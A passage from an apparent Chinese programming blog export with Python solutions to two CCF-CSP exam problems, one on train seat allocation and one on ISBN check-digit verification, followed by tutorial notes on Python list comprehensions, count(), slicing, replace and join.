<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201609-2</div><div class="line">试题名称：火车购票</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    请实现一个铁路购票系统的简单座位分配算法，来处理一节车厢的座位分配。</div><div class="line">    假设一节车厢有20排、每一排5个座位。为方便起见，我们用1到100来给所有的座位编号，第一排是1到5号，第二排是6到10号，依次类推，第20排是96到100号。</div><div class="line">    购票时，一个人可能购一张或多张票，最多不超过5张。如果这几张票可以安排在同一排编号相邻的座位，则应该安排在编号最小的相邻座位。否则应该安排在编号最小的几个空座位中（不考虑是否相邻）。</div><div class="line">    假设初始时车票全部未被购买，现在给了一些购票指令，请你处理这些指令。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含一个整数n，表示购票指令的数量。</div><div class="line">    第二行包含n个整数，每个整数p在1到5之间，表示要购入的票数，相邻的两个数之间使用一个空格分隔。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出n行，每行对应一条指令的处理结果。</div><div class="line">    对于购票指令p，输出p张车票的编号，按从小到大排序。</div><div class="line"></div><div class="line">样例输入</div><div class="line">4</div><div class="line">2 5 4 2</div><div class="line"></div><div class="line">样例输出</div><div class="line">1 2</div><div class="line">6 7 8 9 10</div><div class="line">11 12 13 14</div><div class="line">3 4</div><div class="line"></div><div class="line">样例说明</div><div class="line">1) 购2张票，得到座位1、2。</div><div class="line">2) 购5张票，得到座位6至10。</div><div class="line">3) 购4张票，得到座位11至14。</div><div class="line">4) 购2张票，得到座位3、4。</div><div class="line"></div><div class="line">评测用例规模与约定</div><div class="line">    对于所有评测用例，1 ≤ n ≤ 100，所有购票数量之和不超过100。</div></pre></td></tr></table></figure>
<h4 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h4><p>　　题目的思路比较简单，只是需要注意一些细节。我们初始一个20行5列的0数组来代表车厢中的100个座位，用1和0来标识座位是否卖出。题目中要求，如果这几张票可以安排在同一排编号相邻的座位，则应该安排在编号最小的相邻座位。否则应该安排在编号最小的几个空座位中（不考虑是否相邻）。因此，我们首先处理这种情况，每输入一个购票数，我们从第1排开始安排查找可以满足该购票数的连续座位，并输出座位号。如果到最后一排还没有满足的情况，那我们再从第1排开始安排零散的座位来满足购票数，直到所有座位都被卖出。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())	<span class="comment"># 购票指令数</span></div><div class="line">lst = list(map(int, input().split()))	<span class="comment"># 购票数</span></div><div class="line">c = [[<span class="number">0</span>] * <span class="number">5</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)]	<span class="comment"># 标识是否已经卖出</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> lst:	<span class="comment"># 遍历购票数列表</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):	<span class="comment"># 从第1排开始安排座位</span></div><div class="line">        <span class="keyword">if</span> c[i].count(<span class="number">0</span>) &gt;= k:</div><div class="line">            count = k	<span class="comment"># 需要安排座位的票数</span></div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5</span>):	<span class="comment"># 遍历第i行</span></div><div class="line">                <span class="keyword">if</span> c[i][j] == <span class="number">0</span> <span class="keyword">and</span> count != <span class="number">0</span>:</div><div class="line">                    c[i][j] = <span class="number">1</span>	<span class="comment"># 卖出一张，即i，j位置的</span></div><div class="line">                    count -= <span class="number">1</span>	<span class="comment"># 需要安排座位的票数减1</span></div><div class="line">                    print(i * <span class="number">5</span> + j + <span class="number">1</span>, end=<span class="string">" "</span>)	<span class="comment"># 输出座位号</span></div><div class="line">            print()</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">elif</span> i == <span class="number">19</span> <span class="keyword">and</span> c[i].count(<span class="number">0</span>) &lt; k:	<span class="comment"># 如果已经没有可以分配的连续座位</span></div><div class="line">            count = k</div><div class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">20</span>):	<span class="comment"># 从第1排开始</span></div><div class="line">                <span class="keyword">if</span> count == <span class="number">0</span>:</div><div class="line">                    <span class="keyword">break</span></div><div class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5</span>):	<span class="comment"># 把每一排的空座位安排出去</span></div><div class="line">                    <span class="keyword">if</span> c[b][j] == <span class="number">0</span> <span class="keyword">and</span> count != <span class="number">0</span>:</div><div class="line">                        c[b][j] = <span class="number">1</span></div><div class="line">                        count -= <span class="number">1</span></div><div class="line">                        print(b * <span class="number">5</span> + j + <span class="number">1</span>, end=<span class="string">" "</span>)</div><div class="line">                    <span class="keyword">if</span> count == <span class="number">0</span>:</div><div class="line">                        print()</div><div class="line">                        <span class="keyword">break</span></div></pre></td></tr></table></figure>
<h4 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h4><p>　　由于一开始都是连续分配座位，所以每一排一开始都是连续分配的，那么也就可以不使用二维数组，只用一维数组即可。初始化一个20个0元素的数组，用于记录每一排已经卖出火车票的张数。然后按照题解1的思路，先处理连续座位的情况，再处理非连续的情况。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 购票指令数</span></div><div class="line">lst = list(map(int, input().split()))  <span class="comment"># 购票数</span></div><div class="line">c = [<span class="number">0</span>] * <span class="number">20</span>  <span class="comment"># 标识每一排已经卖出的座位数</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> lst:  <span class="comment"># 遍历购票数列表</span></div><div class="line">    find = <span class="keyword">False</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):  <span class="comment"># 从第1排开始安排座位，连续的情况</span></div><div class="line">        <span class="keyword">if</span> <span class="number">5</span> - c[i] - k &gt;= <span class="number">0</span>:  <span class="comment"># 剩余座位数可以满足购票数</span></div><div class="line">            start = i * <span class="number">5</span> + c[i] + <span class="number">1</span></div><div class="line">            c[i] += k</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(start, start + k):  <span class="comment"># 输出座位号</span></div><div class="line">                print(j, end=<span class="string">" "</span>)</div><div class="line">            print()</div><div class="line">            find = <span class="keyword">True</span>  <span class="comment"># 标识为购票数已经得到满足</span></div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> find:  <span class="comment"># 非连续的情况</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</div><div class="line">            <span class="keyword">if</span> k &gt; <span class="number">0</span> <span class="keyword">and</span> c[i] &lt; <span class="number">5</span>:  <span class="comment"># 非连续座位</span></div><div class="line">                start = i * <span class="number">5</span> + c[i] + <span class="number">1</span></div><div class="line">                length = <span class="number">5</span> - c[i]  <span class="comment"># 剩余座位数</span></div><div class="line">                <span class="keyword">if</span> k &gt; length:  <span class="comment"># 剩余座位数无法满足购票数</span></div><div class="line">                    k -= length</div><div class="line">                    c[i] = <span class="number">5</span></div><div class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> range(start, start + length):</div><div class="line">                        print(j, end=<span class="string">" "</span>)</div><div class="line">                <span class="keyword">else</span>:  <span class="comment"># 可以满足</span></div><div class="line">                    c[i] += k</div><div class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> range(start, start + k):</div><div class="line">                        print(j, end=<span class="string">" "</span>)</div><div class="line">                    print()</div><div class="line">                    <span class="keyword">break</span></div></pre></td></tr></table></figure>
<h4 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h4><h5 id="列表初始化"><a href="#列表初始化" class="headerlink" title="列表初始化"></a>列表初始化</h5><p>　　除了基本的列表初始化方法外，我们还可以使用列表初始化表达式。列表初始化表达式为创建列表提供了一个简单的方法。一个常见的应用就是对于一个序列，将其中的每个元素进行一些操作，产生新的列表，或者是从原序列按照一定条件创建出子列表。例如，使用 <code>map</code> 函数与 <code>lambda</code> 表达式产生平方数列表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>list(map(<span class="keyword">lambda</span> x: x**<span class="number">2</span>, range(<span class="number">10</span>)))</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</div></pre></td></tr></table></figure>
<p>　　或者使用如下等价形式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>[x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)]</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</div></pre></td></tr></table></figure>
<p>　　如题解1中使用列表初始化表达式来构建二维数组：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">c = [[<span class="number">0</span>] * <span class="number">5</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)]</div></pre></td></tr></table></figure>
<p>　　列表初始化表达式由方括号 <code>[]</code> 包含，括号内以 <code>for</code> 语句起始，后接任意个 <code>for</code> 语句或 <code>if</code> 语句。其结果是产生一个新的列表，列表内的元素为其中的 <code>for</code> 语句或 <code>if</code> 语句的执行结果。例如，以下表达式创建了一个列表，列表内的每个元素形如 <code>(x, y)</code>，其中 <code>x</code> 和 <code>y</code> 分别来自两个列表，且 <code>x</code> 与 <code>y</code> 不相等。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>[(x, y) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] <span class="keyword">for</span> y <span class="keyword">in</span> [<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>] <span class="keyword">if</span> x != y]</div><div class="line">[(<span class="number">1</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">4</span>), (<span class="number">2</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">1</span>), (<span class="number">2</span>, <span class="number">4</span>), (<span class="number">3</span>, <span class="number">1</span>), (<span class="number">3</span>, <span class="number">4</span>)]</div></pre></td></tr></table></figure>
<p>　　这种写法等价于：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>combs = []</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]:</div><div class="line"><span class="meta">... </span>    <span class="keyword">for</span> y <span class="keyword">in</span> [<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>]:</div><div class="line"><span class="meta">... </span>        <span class="keyword">if</span> x != y:</div><div class="line"><span class="meta">... </span>            combs.append((x, y))</div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>combs</div><div class="line">[(<span class="number">1</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">4</span>), (<span class="number">2</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">1</span>), (<span class="number">2</span>, <span class="number">4</span>), (<span class="number">3</span>, <span class="number">1</span>), (<span class="number">3</span>, <span class="number">4</span>)]</div></pre></td></tr></table></figure>
<h5 id="列表统计"><a href="#列表统计" class="headerlink" title="列表统计"></a>列表统计</h5><p>　　List 的 <code>count()</code> 方法用于统计某个元素在列表中出现的次数。语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">list.count(obj)</div></pre></td></tr></table></figure>
<p>　　参数列表：<code>obj</code> 列表中统计的对象。</p>
<p>　　返回值：返回元素在列表中出现的次数。</p>
<p>　　使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.count(<span class="number">1</span>)</div><div class="line"><span class="number">2</span></div></pre></td></tr></table></figure>
<h5 id="字符串统计"><a href="#字符串统计" class="headerlink" title="字符串统计"></a>字符串统计</h5><p>　　str 也实现了 <code>count()</code> 方法，它用于统计字符串里某个字符出现的次数。可选参数为在字符串搜索的开始与结束位置。语法格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">str.count(sub, start= <span class="number">0</span>, end=len(string))</div></pre></td></tr></table></figure>
<p>　　参数列表：</p>
<ul>
<li><code>sub</code> 搜索的子字符串。</li>
<li><code>start</code> 字符串开始搜索的位置。默认为第一个字符,第一个字符索引值为 0。</li>
<li><code>end</code> 字符串中结束搜索的位置。字符中第一个字符的索引为 0。默认为字符串的最后一个位置。</li>
</ul>
<p>　　返回值：该方法返回子字符串在字符串中出现的次数。</p>
<p>　　使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"I Love You"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.count(<span class="string">'o'</span>)    <span class="comment"># 统计字符o出现的次数</span></div><div class="line"><span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.count(<span class="string">'o'</span>, <span class="number">4</span>)	<span class="comment"># 从索引为4的字符开始统计</span></div><div class="line"><span class="number">1</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP ISBN号码</title>
    <url>/2018/10/14/CCF-CSP-ISBN%E5%8F%B7%E7%A0%81/</url>
    <content><![CDATA[<center>CCF-CSP 201312-2 ISBN号码 题解</center>

<a id="more"></a>
<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201312-2</div><div class="line">试题名称：ISBN号码</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    每一本正式出版的图书都有一个ISBN号码与之对应，ISBN码包括9位数字、1位识别码和3位分隔符，其规定格式如“x-xxx-xxxxx-x”，其中符号“-”是分隔符（键盘上的减号），最后一位是识别码，例如0-670-82162-4就是一个标准的ISBN码。ISBN码的首位数字表示书籍的出版语言，例如0代表英语；第一个分隔符“-”之后的三位数字代表出版社，例如670代表维京出版社；第二个分隔之后的五位数字代表该书在出版社的编号；最后一位为识别码。</div><div class="line">    识别码的计算方法如下：</div><div class="line">    首位数字乘以1加上次位数字乘以2……以此类推，用所得的结果mod 11，所得的余数即为识别码，如果余数为10，则识别码为大写字母X。例如ISBN号码0-670-82162-4中的识别码4是这样得到的：对067082162这9个数字，从左至右，分别乘以1，2，…，9，再求和，即0×1+6×2+……+2×9=158，然后取158 mod 11的结果4作为识别码。</div><div class="line">    编写程序判断输入的ISBN号码中识别码是否正确，如果正确，则仅输出“Right”；如果错误，则输出是正确的ISBN号码。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入只有一行，是一个字符序列，表示一本书的ISBN号码（保证输入符合ISBN号码的格式要求）。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出一行，假如输入的ISBN号码的识别码正确，那么输出“Right”，否则，按照规定的格式，输出正确的ISBN号码（包括分隔符“-”）。</div><div class="line"></div><div class="line">样例输入</div><div class="line">0-670-82162-4</div><div class="line"></div><div class="line">样例输出</div><div class="line">Right</div><div class="line"></div><div class="line">样例输入</div><div class="line">0-670-82162-0</div><div class="line"></div><div class="line">样例输出</div><div class="line">0-670-82162-4</div></pre></td></tr></table></figure>
<h4 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h4><p>　　这个题思路很简单，只要按照题目所给出的识别码的计算方法进行计算得出即可。但是，要注意，mod 11，所得的余数即为识别码，如果余数为10，则识别码为大写字母X。特别要处理余数为10的情况。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">s = input()</div><div class="line">a = list(map(int, s[<span class="number">0</span>:len(s) - <span class="number">1</span>].replace(<span class="string">'-'</span>, <span class="string">''</span>)))  <span class="comment"># 处理输入</span></div><div class="line">sum = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</div><div class="line">    sum = sum + i * a[i - <span class="number">1</span>]  <span class="comment"># 求和</span></div><div class="line">m = sum % <span class="number">11</span></div><div class="line"><span class="keyword">if</span> (str(m) == s[<span class="number">-1</span>]) <span class="keyword">or</span> (m == <span class="number">10</span> <span class="keyword">and</span> s[<span class="number">-1</span>] == <span class="string">"X"</span>):  <span class="comment"># 识别码正确，输出Right</span></div><div class="line">    print(<span class="string">"Right"</span>)</div><div class="line"><span class="keyword">elif</span> m == <span class="number">10</span> <span class="keyword">and</span> s[<span class="number">-1</span>] != <span class="string">"X"</span>:  <span class="comment"># 处理余数为10且最后一位不为X的情况</span></div><div class="line">    s = s[<span class="number">0</span>:len(s) - <span class="number">1</span>] + <span class="string">"X"</span></div><div class="line">    print(s)</div><div class="line"><span class="keyword">else</span>:  <span class="comment"># 输出正确的识别码</span></div><div class="line">    s = s[<span class="number">0</span>:len(s) - <span class="number">1</span>] + str(m)</div><div class="line">    print(s)</div></pre></td></tr></table></figure>
<h4 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h4><p>　　由于题目结题思路比较简单，所以题解2与题解1没有本质区别，只是程序写法上有一些细节上的区别。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">s = input()</div><div class="line">b = <span class="string">""</span>.join(s.split(<span class="string">'-'</span>))  <span class="comment"># 处理输入</span></div><div class="line">c = int()</div><div class="line">count = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> count &lt; <span class="number">9</span>:</div><div class="line">    c += int(b[count]) * (count + <span class="number">1</span>)</div><div class="line">    count += <span class="number">1</span></div><div class="line">d = c % <span class="number">11</span></div><div class="line"><span class="keyword">if</span> d == <span class="number">10</span>:  <span class="comment"># 处理余数为10的情况</span></div><div class="line">    <span class="keyword">if</span> b[<span class="number">9</span>] == <span class="string">'X'</span>:</div><div class="line">        print(<span class="string">'Right'</span>)  <span class="comment"># 识别码正确，输出Right</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(s[<span class="number">0</span>:<span class="number">12</span>] + <span class="string">'X'</span>)  <span class="comment"># 输出正确的识别码</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">if</span> str(d) == b[<span class="number">9</span>]:</div><div class="line">        print(<span class="string">'Right'</span>)  <span class="comment"># 识别码正确，输出Right</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(s[<span class="number">0</span>:<span class="number">12</span>] + str(d))  <span class="comment"># 输出正确的识别码</span></div></pre></td></tr></table></figure>
<h4 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h4><h5 id="字符串切片"><a href="#字符串切片" class="headerlink" title="字符串切片"></a>字符串切片</h5><p>　　切片操作可以从一个字符串中获取子字符串，语法格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">[start:end:step]</div></pre></td></tr></table></figure>
<ul>
<li><code>[:]</code> 提取从开头（默认位置0）到结尾（默认位置-1）的整个字符串</li>
<li><code>[start:]</code> 从 <code>start</code> 提取到结尾</li>
<li><code>[:end]</code> 从开头提取到 <code>end - 1</code></li>
<li><code>[start:end]</code> 从 <code>start</code> 提取到 <code>end - 1</code></li>
<li><code>[start:end:step]</code> 从 <code>start</code> 提取到 <code>end - 1</code>，每 <code>step</code> 个字符提取一个</li>
<li>左侧第一个字符的位置/偏移量为 <code>0</code>，右侧最后一个字符的位置/偏移量为 <code>-1</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"abcdefgh"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s[<span class="number">0</span>:<span class="number">2</span>]	<span class="comment"># 前两个字符</span></div><div class="line"><span class="string">'ab'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s[<span class="number">0</span>:]	<span class="comment"># 整个字符串</span></div><div class="line"><span class="string">'abcdefgh'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s[:]	<span class="comment"># 整个字符串</span></div><div class="line"><span class="string">'abcdefgh'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s[:<span class="number">-1</span>]	<span class="comment"># 去除字符串最后一个字符</span></div><div class="line"><span class="string">'abcdefg'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s[<span class="number">-2</span>:]	<span class="comment"># 倒数两个字符</span></div><div class="line"><span class="string">'gh'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s[::<span class="number">2</span>]	<span class="comment"># 步长为2</span></div><div class="line"><span class="string">'aceg'</span></div></pre></td></tr></table></figure>
<h5 id="字符串替换"><a href="#字符串替换" class="headerlink" title="字符串替换"></a>字符串替换</h5><ul>
<li><strong>切片实现替换</strong></li>
</ul>
<p>　　最简单的办法是通过字符串切片与连接操作来实现字符串替换：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">'abcd'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s[:<span class="number">2</span>] + <span class="string">'ef'</span>	<span class="comment"># 替换后两个字符</span></div><div class="line"><span class="string">'abef'</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>replace() 方法</strong></li>
</ul>
<p>　　<code>replace()</code> 方法把字符串中的 旧字符串替换成新字符串，如果指定第三个参数 <code>max</code>，则替换不超过 <code>max</code> 次。语法格式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">str.replace(old, new[, max])</div></pre></td></tr></table></figure>
<p>　　参数说明：</p>
<ul>
<li><code>old</code> 将被替换的子字符串。</li>
<li><code>new</code> 用于替换 <code>old</code> 子字符串的新字符串。</li>
<li><code>max</code> 可选参数, 替换不超过 <code>max</code> 次。</li>
</ul>
<p>　　返回值：</p>
<p>　　返回字符串中的 <code>old</code>（旧字符串） 替换成 <code>new</code> （新字符串）后生成的新字符串，如果指定第三个参数<code>max</code>，则替换不超过 <code>max</code> 次。</p>
<p>　　使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"a-b-c-d"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.replace(<span class="string">'-'</span>, <span class="string">''</span>)</div><div class="line"><span class="string">'abcd'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.replace(<span class="string">'-'</span>, <span class="string">''</span>, <span class="number">2</span>)	<span class="comment"># 指定只替换两次</span></div><div class="line"><span class="string">'abc-d'</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>正则表达式</strong></li>
</ul>
<p>　　使用正则表达式模块也可以实现替换。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">re.sub(pattern, repl, string, count)</div></pre></td></tr></table></figure>
<p>　　参数说明：</p>
<ul>
<li><code>pattern</code> 为正则表达式需要被替换的参数</li>
<li><code>repl</code> 是替换后的字符串</li>
<li><code>string</code> 为输入的字符串</li>
<li><code>count</code> 指替换个数。默认为0，表示每个匹配项都替换。</li>
</ul>
<p>　　使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line">s = <span class="string">"Hello World!"</span></div><div class="line">print(re.sub(<span class="string">'[A-Z]'</span>, <span class="string">'*'</span>, s))	<span class="comment"># 将s中的大写字母替换为*号</span></div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">*ello *orld!</div></pre></td></tr></table></figure>
<ul>
<li>替换指定位置的字符**</li>
</ul>
<p>　　将字符串转换成列表后修改值，然后用 <code>join()</code> 方法组成新字符串。替换单个位置的字符：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace_by_index</span><span class="params">(string, index, c)</span>:</span></div><div class="line">    new = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</div><div class="line">        new.append(i)</div><div class="line">    new[index] = c</div><div class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(new)</div><div class="line"></div><div class="line"><span class="comment"># 将索引为2的字符替换为f</span></div><div class="line">res = replace_by_index(<span class="string">"abcd"</span>, <span class="number">2</span>, <span class="string">'f'</span>)</div><div class="line">print(res)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">abfd</div></pre></td></tr></table></figure>
<p>　　替换字符串中多个指定位置为指定字符：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># 替换字符串中多个指定位置的字符</span></div><div class="line"><span class="comment"># pos:位置列表，chr:对应替换的字符列表</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">multi_replace_by_index</span><span class="params">(s, pos, chr)</span>:</span></div><div class="line">    new = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</div><div class="line">        new.append(i)</div><div class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> pos:</div><div class="line">        new[index] = chr[index<span class="number">-1</span>]</div><div class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(new)</div><div class="line"></div><div class="line"></div><div class="line">res = multi_replace_by_index(<span class="string">"abcd"</span>, [<span class="number">1</span>, <span class="number">2</span>], [<span class="string">'f'</span>, <span class="string">'m'</span>])</div><div class="line">print(res)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">afmd</div></pre></td></tr></table></figure>
<h5 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h5><ul>
<li><strong>+号</strong></li>
</ul>
<p>　　使用加号可以直接连接两个字符串，返回新的字符串。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = <span class="string">"ab"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = <span class="string">"cd"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s1 + s2</div><div class="line"><span class="string">'abcd'</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>join() 方法</strong></li>
</ul>
<p>　　<code>join()</code> 方法用于将序列中的元素以指定的字符连接生成一个新的字符串。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">str.join(sequence)</div></pre></td></tr></table></figure>
<p>　　参数说明：<code>sequence</code> – 要连接的元素序列。<code>sequence</code> 中的元素必须是字符或字符串，否则会报错。</p>
<p>　　返回值：返回通过指定字符连接序列中元素后生成的新字符串。</p>
<p>　　使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = <span class="string">"-"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>seq = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>]	<span class="comment">#连接的序列是列表</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s1.join(seq)</div><div class="line"><span class="string">'a-b-c-d'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>seq = (<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>)	<span class="comment">#连接的序列是元组</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s1.join(seq)</div><div class="line"><span class="string">'a-b-c-d'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>seq = <span class="string">"ijkl"</span>	<span class="comment">#连接的序列是字符串</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s1.join(seq)</div><div class="line"><span class="string">'i-j-k-l'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>seq = &#123;<span class="string">"m"</span>:<span class="number">1</span>, <span class="string">"n"</span>:<span class="number">2</span>, <span class="string">"o"</span>:<span class="number">3</span>, <span class="string">"p"</span>:<span class="number">4</span>&#125;	<span class="comment">#连接的序列是字典，会将所有key连接起来</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s1.join(seq)</div><div class="line"><span class="string">'m-n-o-p'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = <span class="string">"---"</span>	<span class="comment">#使用多字符连接序列</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>seq = <span class="string">"abcd"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s1.join(seq)</div><div class="line"><span class="string">'a---b---c---d'</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>format() 方法</strong></li>
</ul>
<p>　　<code>str.format()</code> 为格式化字符串的函数。基本语法是通过 {} 和 : 来代替以前的 % 。<code>format()</code> 函数可以接受不限个参数，位置可以不按顺序。</p>
